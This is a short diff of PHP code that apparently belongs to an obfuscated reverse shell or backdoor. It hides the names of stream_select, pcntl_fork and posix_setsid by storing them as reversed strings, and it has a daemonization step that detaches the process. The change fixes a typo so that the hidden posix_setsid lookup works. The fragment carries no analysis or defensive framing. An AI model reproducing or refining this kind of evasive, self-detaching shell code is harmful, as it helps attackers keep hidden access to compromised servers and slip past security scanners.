@@ -20,7 +20,7 @@ $f4 = strrev('tceles_maerts');           // stream_select
 
 // Optional daemonization
 $pcntl = function_exists(strrev('krof_ltncp'));  // pcntl_fork
-$posix = function_exists(strrev('disstes_xisop')); // posix_setssid
+$posix = function_exists(strrev('distes_xisop')); // posix_setsid
 
 if ($pcntl && $posix) {
     $pid = pcntl_fork();
